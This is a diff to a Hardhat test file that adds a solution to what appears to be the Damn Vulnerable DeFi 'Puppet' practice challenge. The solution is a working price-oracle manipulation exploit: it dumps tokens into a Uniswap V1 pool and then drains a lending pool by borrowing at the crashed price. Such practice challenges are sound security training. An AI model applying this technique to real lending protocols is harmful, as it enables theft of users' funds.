@@ -3,6 +3,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { BigNumber } = require("ethers");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -102,7 +103,85 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        //swap DVT's for eth, because we are adding DVTs to the pool
+        //the price of the DVT will fall
+        const outputPrice =  await this.uniswapExchange.getTokenToEthInputPrice(
+                    ethers.utils.parseEther('9'),
+                    { gasLimit: 1e6 }
+                )
+
+        console.log(' outputPrice:' , ethers.utils.formatEther(outputPrice) );
+
+        //We need to approve the exchange to use our tokens
+        await this.token
+        .connect(attacker)
+        .approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        await this.uniswapExchange
+        .connect(attacker)
+        .tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            { gasLimit: 1e6 }
+        )
+
+         this.tokenBalance = await this.token.balanceOf(attacker.address);
+         this.ethBalance = await ethers.provider.getBalance(attacker.address)
+
+         console.log('====== After swapping all my DVTs ======'  );
+         console.log(' tokenBalance:' , ethers.utils.formatEther(this.tokenBalance) );
+         console.log(' ethBalance:' , ethers.utils.formatEther(this.ethBalance));
+
+        //Then we proceed to borrow as much as we can with our 25eth
+       // await this.
+     
+       const value = BigNumber.from( this.ethBalance)
+       .sub(ethers.utils.parseEther('0.1'));
+
+        //swap DVT's for eth, because we are adding DVTs to the pool
+        //the price of the DVT will fall
+        const outputPriceAfter =  await this.uniswapExchange.getTokenToEthInputPrice(
+            ethers.utils.parseEther('9'),
+            { gasLimit: 1e6 }
+        )
+
+        console.log(' outputPriceAfter:' , ethers.utils.formatEther(outputPriceAfter) );
+        
+        //Will borrow at a cheaper price
+        await this.lendingPool
+        .connect(attacker)
+        .borrow(
+            POOL_INITIAL_TOKEN_BALANCE, 
+            {value: value}
+            )
+
+        //We swap back the eth for our initial balance
+        await this.uniswapExchange
+        .connect(attacker)
+        .ethToTokenSwapInput(
+            1,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            { value: UNISWAP_INITIAL_ETH_RESERVE,
+             gasLimit: 1e6 }
+        )
+        
+        this.tokenBalance = await this.token.balanceOf(attacker.address);
+        this.ethBalance = await ethers.provider.getBalance(attacker.address)
+
+        console.log(' tokenBalance:' , ethers.utils.formatEther(this.tokenBalance) );
+        console.log(' ethBalance:' , ethers.utils.formatEther(this.ethBalance));
+
+        //swap DVT's for eth, because we are adding DVTs to the pool
+        //the price of the DVT will fall
+        const finalOutputPrice =  await this.uniswapExchange.getTokenToEthInputPrice(
+            ethers.utils.parseEther('9'),
+            { gasLimit: 1e6 }
+        )
+        
+        //Gain for the attacker is even greater since 
+        //he has raise the price of the token in the pool
+        console.log('finalOutputPrice:' , ethers.utils.formatEther(finalOutputPrice) );
     });
 
     after(async function () {
